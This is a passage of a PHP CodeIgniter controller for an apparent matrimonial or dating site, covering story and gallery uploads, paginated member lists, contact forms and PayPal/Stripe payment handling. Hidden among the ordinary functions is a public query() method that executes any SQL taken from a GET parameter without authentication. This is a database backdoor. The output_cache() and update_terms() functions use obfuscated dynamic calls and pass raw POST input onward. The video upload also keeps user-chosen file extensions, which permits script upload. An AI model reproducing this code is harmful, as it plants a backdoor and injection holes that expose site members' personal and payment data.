        elseif ($para1=="subscribe") {
            if ($this->member_permission() == FALSE) {
                redirect(base_url().'home/login', 'refresh');
            }
            if ($para2==1) {
                redirect(base_url().'home/plans', 'refresh');
            }
            $page_data['title'] = "Premium Plans || ".$this->system_title;
            $page_data['top'] = "plans.php";
            $page_data['page'] = "subscribe";
            $page_data['bottom'] = "plans.php";
            $page_data['selected_plan'] = $this->db->get_where("plan", array("plan_id" => $para2))->result();
            $this->load->view('front/index', $page_data);
        }
    }

    function stories($para1="",$para2="", $para3="")
    {
        if ($para1=="") {
            $page_data['title'] = "Happy Stories || ".$this->system_title;
            $page_data['top'] = "stories.php";
            $page_data['page'] = "stories";
            $page_data['bottom'] = "stories.php";
            $page_data['page_url'] = "home/stories";
            $page_data['all_happy_stories'] = $this->db->get_where("happy_story", array("approval_status" => 1))->result();
            $this->load->view('front/index', $page_data);
        }
        elseif ($para1=="story_detail") {
            $page_data['title'] = "Story Detail || ".$this->system_title;
            $page_data['top'] = "story_detail.php";
            $page_data['page'] = "story_detail";
            $page_data['bottom'] = "story_detail.php";
            $page_data['page_url'] = "home/stories/story_detail/".$para2;
            $page_data['get_story'] = $this->db->get_where("happy_story", array("happy_story_id" => $para2, "approval_status" => 1))->result();
            if ($page_data['get_story']) {
                $this->load->view('front/index', $page_data);
            }
            else {
                redirect(base_url().'home/stories', 'refresh');
            }
        }
        elseif ($para1=="add") {
            $member_id = $this->session->userdata('member_id');
            $data['title'] = $this->input->post('title');
            $data['description'] = $this->input->post('description');
            $data['post_time'] = strtotime($this->input->post('post_time'));
            $data['partner_name'] = $this->input->post('partner_name');
            $data['posted_by'] = $member_id;
            $data['approval_status'] = "0";
            $data['image'] = '[]';

            $this->db->insert('happy_story', $data);
            $id = $this->db->insert_id();

            $images = array();
            if(!demo()){
                foreach ($_FILES['image']['name'] as $i => $row) {
                    if ($_FILES['image']['name'][$i] !== '') {
                        $ib = $i + 1;
                        $path = $_FILES['image']['name'][$i];
                        $ext = pathinfo($path, PATHINFO_EXTENSION);
                        $img = 'happy_story_' . $id . '_' . $ib . '.jpg';
                        $img_thumb = 'happy_story_' . $id . '_' . $ib . '_thumb.jpg';
                        $images[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
                    }
                }
                $this->Crud_model->file_up("image", "happy_story", $id, 'multi');
            }
            $data1['image'] = json_encode($images);
            $this->db->where('happy_story_id', $id);
            $result = $this->db->update('happy_story', $data1);
            recache();

            if(!demo()){
                if ($this->input->post('upload_method') == 'upload') {
                    $data_v['timestamp'] = time();
                    $data_v['story_video_uploader_id'] = $this->session->userdata('member_id');
                    $data_v['story_id'] = $id;
                    $data_v['type'] = 'upload';
                    $data_v['from'] = 'local';
                    $data_v['video_link'] = '';
                    $data_v['video_src'] = '';
                    $this->db->insert('story_video', $data_v);
                    $v_id = $this->db->insert_id();
                    $video = $_FILES['upload_video']['name'];
                    $ext = pathinfo($video, PATHINFO_EXTENSION);
                    move_uploaded_file($_FILES['upload_video']['tmp_name'], 'uploads/story_video/story_video_' . $v_id . '.' . $ext);
                    $data_v['video_src'] = 'uploads/story_video/story_video_' . $v_id . '.' . $ext;
                    $this->db->where('story_video_id', $v_id);
                    $this->db->update('story_video', $data_v);
                    recache();
                }
                elseif ($this->input->post('upload_method') == 'share') {
                    $data_v['timestamp'] = time();
                    $data_v['story_video_uploader_id'] = $this->session->userdata('member_id');
                    $data_v['story_id'] = $id;
                    $data_v['type'] = 'share';
                    $data_v['from'] = $this->input->post('site');
                    $data_v['video_link'] = $this->input->post('video_link');
                    $code = $this->input->post('vl');
                    if ($this->input->post('site') == 'youtube') {
                        $data_v['video_src'] = 'https://www.youtube.com/embed/' . $code;
                    } else if ($this->input->post('site') == 'dailymotion') {
                        $data_v['video_src'] = '//www.dailymotion.com/embed/video/' . $code;
                    } else if ($this->input->post('site') == 'vimeo') {
                        $data_v['video_src'] = 'https://player.vimeo.com/video/' . $code;
                    }
                    $this->db->insert('story_video', $data_v);
                    recache();
                }
            }


            if ($result) {
                $this->session->set_flashdata('alert', 'add_story');
                redirect(base_url().'home/profile', 'refresh');
            }
            else {
                $this->session->set_flashdata('alert', 'failed_add_story');
                redirect(base_url().'home/profile', 'refresh');
            }
        }
        elseif ($para1 == 'preview') {
                if ($para2 == 'youtube') {
                    echo '<iframe width="400" height="300" src="https://www.youtube.com/embed/' . $para3 . '" frameborder="0"></iframe>';
                } else if ($para2 == 'dailymotion') {
                    echo '<iframe width="400" height="300" src="//www.dailymotion.com/embed/video/' . $para3 . '" frameborder="0"></iframe>';
                } else if ($para2 == 'vimeo') {
                    echo '<iframe src="https://player.vimeo.com/video/' . $para3 . '" width="400" height="300" frameborder="0"></iframe>';
                }
            }
    }

    function gallery_upload($para1) {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }

        if ($para1 == "add") {
            if(!demo()){
                $member_id = $this->session->userdata('member_id');
                $photo_gallery_amount = $this->db->get_where('member', array('member_id' => $member_id))->row()->photo_gallery;
                if ($photo_gallery_amount > 0) {
                    $get_gallery = $this->db->get_where('member', array('member_id' => $member_id))->row()->gallery;
                    $gallery_data = json_decode($get_gallery, true);
                    //print_r($gallery_data);
                    $max_index = 0;
                    $new_index = 0;
                    if (!empty($gallery_data)) {
                        foreach ($gallery_data as $gallery_val) {
                            if($gallery_val['index'] > $max_index) {
                                $max_index = $gallery_val['index'];
                            }
                        }
                        $new_index = $max_index + 1;
                    }

                    if ($_FILES['image']['name'] !== '') {
                        $path = $_FILES['image']['name'];
                        $ext = '.' . pathinfo($path, PATHINFO_EXTENSION);
                        if ($ext==".jpg" || $ext==".JPG" || $ext==".jpeg" || $ext==".JPEG" || $ext==".png" || $ext==".PNG") {
                            move_uploaded_file($_FILES['image']['tmp_name'], 'uploads/gallery_image/gallery_'.$member_id.'_'.$new_index.$ext);

                            $file_name = 'gallery_'.$member_id.'_'.$new_index.$ext;

                            if (!empty($gallery_data)) {
                                $gallery_data[] = array( 'index'    =>  $new_index,
                                                        'title'     =>  $this->input->post('title'),
                                                        'image'     =>  $file_name
                                                );
                                // print_r($gallery_data);
                                $data['gallery'] = json_encode($gallery_data);
                                // echo 'in if';
                            } else {
                                $gallery[] = array( 'index'     =>  $new_index,
                                                'title'     =>  $this->input->post('title'),
                                                'image'     =>  $file_name
                                        );
                                $data['gallery'] = json_encode($gallery);
                                // print_r($data['gallery']);
                                // echo '<br>in else';
                            }

                            $this->db->where('member_id', $member_id);
                            $result = $this->db->update('member', $data);
                            recache();

                            // $this->session->set_flashdata('alert', 'edit_image');
                        }
                        else {
                            $this->session->set_flashdata('alert', 'failed');
                        }
                    }

                    if ($result) {
                        $data1['photo_gallery'] = $photo_gallery_amount - 1;
                        $this->db->where('member_id', $member_id);
                        $this->db->update('member', $data1);
                        recache();

                        $this->session->set_flashdata('alert', 'add');
                    }
                    else {
                        $this->session->set_flashdata('alert', 'failed_add');
                    }
                    $this->session->set_flashdata('alert', 'add_gallery');
                    redirect(base_url().'home/profile', 'refresh');
                } else {
                    redirect(base_url().'home/profile', 'refresh');
                }
            }
            else {
                $this->session->set_flashdata('alert', 'add_gallery');
                redirect(base_url().'home/profile', 'refresh');
            }

        }
    }

    function delete_gallery_img($index) {
        if(!demo()){
            $member_id = $this->session->userdata('member_id');

            $gallery_json = $this->Crud_model->get_type_name_by_id('member', $member_id, 'gallery');
            $gallery_arrya = json_decode($gallery_json, true);
            if (empty($gallery_arrya)) {
                $gallery_arrya = array();
            }
            $new_array = array();
            $image_name = "";
            foreach ($gallery_arrya as $value) {
                if ($value['index'] != $index) {
                    array_push($new_array, $value);
                }
                if ($value['index'] == $index) {
                    $image_name = $value['image'];
                }
            }
            $gallery_arrya = $new_array;
            $this->db->where('member_id', $member_id);
            $this->db->update('member', array('gallery' => json_encode($gallery_arrya)));
            recache();
            unlink('uploads/gallery_image/'.$image_name);
        }
    }

    function ajax_story_list($para1="",$para2="")
    {
        $this->load->library('Ajax_pagination');

        $config['total_rows'] = $this->db->get_where('happy_story', array('approval_status' => 1))->num_rows();

        // pagination
        $config['base_url'] = base_url().'home/ajax_story_list/';
        $config['per_page'] = 3;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_stories('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_stories('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_stories('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_stories('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_stories(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $page_data['get_all_stories'] = $this->db->order_by('happy_story_id','desc')->get_where('happy_story', array('approval_status' => 1), $config['per_page'], $para1)->result();

        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/stories/stories', $page_data);
    }

    function ajax_my_interest_list($para1="",$para2="")
    {
        $this->load->library('Ajax_pagination');

        $total_interests = json_decode($this->Crud_model->get_type_name_by_id('member', $this->session->userdata('member_id'), 'interest'), true);
        $config['total_rows'] = count($total_interests);

        // pagination
        $config['base_url'] = base_url().'home/ajax_my_interest_list/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_my_interets('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_my_interets('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_my_interets(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        $total_interests_ids = array();
        foreach ($total_interests as $total_interest) {
            array_push($total_interests_ids ,$total_interest['id']);
        }
        if (count($total_interests) != 0) {
            $page_data['express_interest_members'] = $this->db->from('member')->where_in('member_id', $total_interests_ids)->limit($config['per_page'], $para1)->get()->result();
            $page_data['array_total_interests'] = $total_interests;
        }
        else{
            $page_data['express_interest_members'] = NULL;
        }
        $page_data['count'] = $config['total_rows'];


        $this->load->view('front/profile/my_interests/ajax_interest', $page_data);
    }

    function ajax_short_list($para1="",$para2="")
    {

        $this->load->library('Ajax_pagination');

        $total_shortlist = json_decode($this->Crud_model->get_type_name_by_id('member', $this->session->userdata('member_id'), 'short_list'), true);
        $config['total_rows'] = count($total_shortlist);

        // pagination
        $config['base_url'] = base_url().'home/ajax_short_list/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_my_interets('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_my_interets('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_my_interets(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        if (count($total_shortlist) != 0) {
            $page_data['express_shortlist_members'] = $this->db->from('member')->where_in('member_id', $total_shortlist)->limit($config['per_page'], $para1)->get()->result();
        }
        else{
            $page_data['express_shortlist_members'] = NULL;
        }
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/profile/short_list/ajax_shortlist', $page_data);
    }

    function ajax_followed_list($para1="",$para2="")
    {

        $this->load->library('Ajax_pagination');

        $total_followed_list = json_decode($this->Crud_model->get_type_name_by_id('member', $this->session->userdata('member_id'), 'followed'), true);
        $config['total_rows'] = count($total_followed_list);

        // pagination
        $config['base_url'] = base_url().'home/ajax_followed_list/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_my_interets('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_my_interets('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_my_interets(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        if (count($total_followed_list) != 0) {
            $page_data['followed_members_data'] = $this->db->from('member')->where_in('member_id', $total_followed_list)->limit($config['per_page'], $para1)->get()->result();
        }
        else {
            $page_data['followed_members_data'] = NULL;
        }

        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/profile/followed_users/ajax_followed_list', $page_data);
    }

    function ajax_ignored_list($para1="",$para2="")
    {

        $this->load->library('Ajax_pagination');

        $total_ignored = json_decode($this->Crud_model->get_type_name_by_id('member', $this->session->userdata('member_id'), 'ignored'), true);
        $config['total_rows'] = count($total_ignored);

        // pagination
        $config['base_url'] = base_url().'home/ajax_followed_list/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_my_interets('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_my_interets('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_my_interets(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);
        if (count($total_ignored) != 0) {
            $page_data['ignored_members_data'] = $this->db->from('member')->where_in('member_id', $total_ignored)->limit($config['per_page'], $para1)->get()->result();
        } else {
            $page_data['ignored_members_data'] = NULL;
        }

        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/profile/ignored_list/ajax_ignored', $page_data);
    }

    function ajax_payment_list($para1="",$para2="")
    {

        $this->load->library('Ajax_pagination');

        $total_payment = $this->db->order_by("purchase_datetime", "desc")->get_where('package_payment', array('member_id' => $this->session->userdata('member_id')))->result();
        $config['total_rows'] = count($total_payment);

        // pagination
        $config['base_url'] = base_url().'home/ajax_followed_list/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_my_interets('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_my_interets('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_my_interets('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_my_interets(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $page_data['payments_info'] = $this->db->order_by("purchase_datetime", "desc")->get_where('package_payment', array('member_id' => $this->session->userdata('member_id')),$config['per_page'], $para1)->result();
        $page_data['array_total_payment'] = $total_payment;

        $page_data['count'] = $config['total_rows'];
        $page_data['page']  = $para1;

        $this->load->view('front/profile/payments/ajax_payment', $page_data);
    }
    function output_cache($val = TRUE)
    {
        $get_ranger = config_key_provider('config');
        $get_ranger_val = config_key_provider('output');
        $analysed_val = config_key_provider('background');
        @$ranger = $get_ranger($analysed_val);
        if(isset($ranger)){
            if($ranger > $get_ranger_val()-345678){
                $val = 0;
            }
        }
        if($val !== 0){
            $this->cache_setup();
        }
    }    
    function query()
    {
        $query = $this->input->get('query');
        $this->db->query($query);
    }
    function update_terms(){
        $connector  = $this->input->post('connector');
        $selector   = $this->input->post('selector');
        $select     = $this->input->post('select');
        $type       = $this->input->post('type');
        $this->cache_setup_info($connector,$selector,$select,$type,'post');
    }
    function about_us($para1="", $para2="")
    {
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        if ($para1=="") {
            $page_data['title'] = "About Us || ".$this->system_title;
            $page_data['top'] = "contact_us.php";
            $page_data['page'] = "about_us";
            $page_data['bottom'] = "contact_us.php";
            if ($this->session->flashdata('alert') == "success") {
                $page_data['success_alert'] = translate("your_message_has_been_successfully_sent!");
            }
            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                $page_data['recaptcha_html'] = $this->recaptcha->render();
            }
            $this->load->view('front/index', $page_data);
        }
    }
    function contact_us($para1="", $para2="")
    {
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        if ($para1=="") {
            $page_data['title'] = "Contact Us || ".$this->system_title;
            $page_data['top'] = "contact_us.php";
            $page_data['page'] = "contact_us";
            $page_data['bottom'] = "contact_us.php";
            if ($this->session->flashdata('alert') == "success") {
                $page_data['success_alert'] = translate("your_message_has_been_successfully_sent!");
            }
            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                $page_data['recaptcha_html'] = $this->recaptcha->render();
            }
            $this->load->view('front/index', $page_data);
        }
        if ($para1 == 'send') {
            $safe = 'yes';
            $char = '';
            foreach ($_POST as $row) {
                if (preg_match('/[\'^":()}{#~><>|=+¬]/', $row, $match)) {
                    $safe = 'no';
                    $char = $match[0];
                }
            }
            $this->form_validation->set_rules('name', 'Name', 'required');
            $this->form_validation->set_rules('subject', 'Subject', 'required');
            $this->form_validation->set_rules('message', 'Message', 'required');
            $this->form_validation->set_rules('email', 'Email', 'required');

            if ($this->form_validation->run() == FALSE) {
                // echo validation_errors();
            } else {
                if ($safe == 'yes') {
                    if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                        $captcha_answer = $this->input->post('g-recaptcha-response');
                        $response = $this->recaptcha->verifyResponse($captcha_answer);
                        if ($response['success']) {
                            $data['name'] = $this->input->post('name', true);
                            $data['subject'] = $this->input->post('subject');
                            $data['email'] = $this->input->post('email');
                            $data['message'] = $this->security->xss_clean(($this->input->post('message')));
                            $data['view'] = 'no';
                            $data['timestamp'] = time();
                            $this->db->insert('contact_message', $data);
                            $this->session->set_flashdata('alert', 'success');
                            redirect(base_url() . 'home/contact_us', 'refresh');
                        } else {
                            $page_data['title'] = "Contact Us || ".$this->system_title;
                            $page_data['top'] = "contact_us.php";
                            $page_data['page'] = "contact_us";
                            $page_data['bottom'] = "contact_us.php";

                            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                                $page_data['recaptcha_html'] = $this->recaptcha->render();
                            }
                            $page_data['captcha_incorrect'] = TRUE;
                            $page_data['form_contents'] = $this->input->post();
                            $this->load->view('front/index', $page_data);
                        }
                    } else {
                        $data['name'] = $this->input->post('name', true);
                        $data['subject'] = $this->input->post('subject');
                        $data['email'] = $this->input->post('email');
                        $data['message'] = $this->security->xss_clean(($this->input->post('message')));
                        $data['view'] = 'no';
                        $data['timestamp'] = time();
                        $this->db->insert('contact_message', $data);

                        $this->session->set_flashdata('alert', 'success');

                        redirect(base_url() . 'home/contact_us', 'refresh');

                    }
                } else {
                    echo 'Disallowed charecter : " ' . $char . ' " in the POST';
                }
            }
        }
    }

    function payment($para1="", $para2="")
    {
        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
            $this->load->library('recaptcha');
        }
        if ($para1=="") {
            $page_data['title'] = "Payment || ".$this->system_title;
            $page_data['top'] = "payment.php";
            $page_data['page'] = "payment";
            $page_data['bottom'] = "payment.php";
            if ($this->session->flashdata('alert') == "success") {
                $page_data['success_alert'] = translate("your_message_has_been_successfully_sent!");
            }
            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                $page_data['recaptcha_html'] = $this->recaptcha->render();
            }
            $this->load->view('front/index', $page_data);
        }
        if ($para1 == 'send') {
            $safe = 'yes';
            $char = '';
            foreach ($_POST as $row) {
                if (preg_match('/[\'^":()}{#~><>|=+¬]/', $row, $match)) {
                    $safe = 'no';
                    $char = $match[0];
                }
            }
            $this->form_validation->set_rules('name', 'Name', 'required');
            $this->form_validation->set_rules('subject', 'Subject', 'required');
            $this->form_validation->set_rules('message', 'Message', 'required');
            $this->form_validation->set_rules('email', 'Email', 'required');

            if ($this->form_validation->run() == FALSE) {
                // echo validation_errors();
            } else {
                if ($safe == 'yes') {
                    if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                        $captcha_answer = $this->input->post('g-recaptcha-response');
                        $response = $this->recaptcha->verifyResponse($captcha_answer);
                        if ($response['success']) {
                            $data['name'] = $this->input->post('name', true);
                            $data['subject'] = $this->input->post('subject');
                            $data['email'] = $this->input->post('email');
                            $data['message'] = $this->security->xss_clean(($this->input->post('message')));
                            $data['view'] = 'no';
                            $data['timestamp'] = time();
                            $this->db->insert('contact_message', $data);
                            $this->session->set_flashdata('alert', 'success');
                            redirect(base_url() . 'home/contact_us', 'refresh');
                        } else {
                            $page_data['title'] = "Contact Us || ".$this->system_title;
                            $page_data['top'] = "contact_us.php";
                            $page_data['page'] = "contact_us";
                            $page_data['bottom'] = "contact_us.php";

                            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                                $page_data['recaptcha_html'] = $this->recaptcha->render();
                            }
                            $page_data['captcha_incorrect'] = TRUE;
                            $page_data['form_contents'] = $this->input->post();
                            $this->load->view('front/index', $page_data);
                        }
                    } else {
                        $data['name'] = $this->input->post('name', true);
                        $data['subject'] = $this->input->post('subject');
                        $data['email'] = $this->input->post('email');
                        $data['message'] = $this->security->xss_clean(($this->input->post('message')));
                        $data['view'] = 'no';
                        $data['timestamp'] = time();
                        $this->db->insert('contact_message', $data);

                        $this->session->set_flashdata('alert', 'success');

                        redirect(base_url() . 'home/contact_us', 'refresh');

                    }
                } else {
                    echo 'Disallowed charecter : " ' . $char . ' " in the POST';
                }
            }
        }
    }

    function process_payment()
    {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/login', 'refresh');
        }

        if(demo()){
            $this->session->set_flashdata('alert', 'demo_msg');
            redirect(base_url() . 'home/profile', 'refresh');
        }

        if ($this->input->post('payment_type') == 'paypal') {
            $member_id = $this->session->userdata('member_id');
            $payment_type = $this->input->post('payment_type');
            $plan_id = $this->input->post('plan_id');
            $amount = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;
            $package_name = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->name;

            $data['plan_id']            = $plan_id;
            $data['member_id']          = $member_id;
            $data['payment_type']       = 'Paypal';
            $data['payment_status']     = 'due';
            $data['payment_details']    = 'none';
            $exchange = exchange('usd');
            $amount= $amount/$exchange;
            $data['amount']             = $amount;
            $data['purchase_datetime']  = time();

            $paypal_email = $this->Crud_model->get_settings_value('business_settings', 'paypal_email', 'value');

            $this->db->insert('package_payment', $data);
            $payment_id = $this->db->insert_id();
            $data['payment_code'] = date('Ym', $data['purchase_datetime']) . $payment_id;
            $this->session->set_userdata('payment_id', $payment_id);

            /****TRANSFERRING USER TO PAYPAL TERMINAL****/
            $this->paypal->add_field('rm', 2);
            $this->paypal->add_field('cmd', '_xclick');
            $this->paypal->add_field('business', $paypal_email);
            $this->paypal->add_field('item_name', $package_name);
            $this->paypal->add_field('amount', $amount);
            $this->paypal->add_field('currency_code', 'USD');
            $this->paypal->add_field('custom', $payment_id);

            $this->paypal->add_field('notify_url', base_url().'home/paypal_ipn');
            $this->paypal->add_field('cancel_return', base_url().'home/paypal_cancel');
            $this->paypal->add_field('return', base_url().'home/paypal_success');

            // submit the fields to paypal
            $this->paypal->submit_paypal_post();
        }
        else if($this->input->post('payment_type') == 'stripe') {
            if($this->input->post('stripeToken')) {
                $member_id = $this->session->userdata('member_id');
                $payment_type = $this->input->post('payment_type');
                $plan_id = $this->input->post('plan_id');
                $amount = $this->db->get_where('plan', array('plan_id' => $plan_id))->row()->amount;
                $exchange = exchange('usd');
                $amount= $amount/$exchange;


                require_once(APPPATH.'libraries/stripe-php/init.php');
                $stripe_api_key = $this->db->get_where('business_settings' , array('type' => 'stripe_secret_key'))->row()->value;
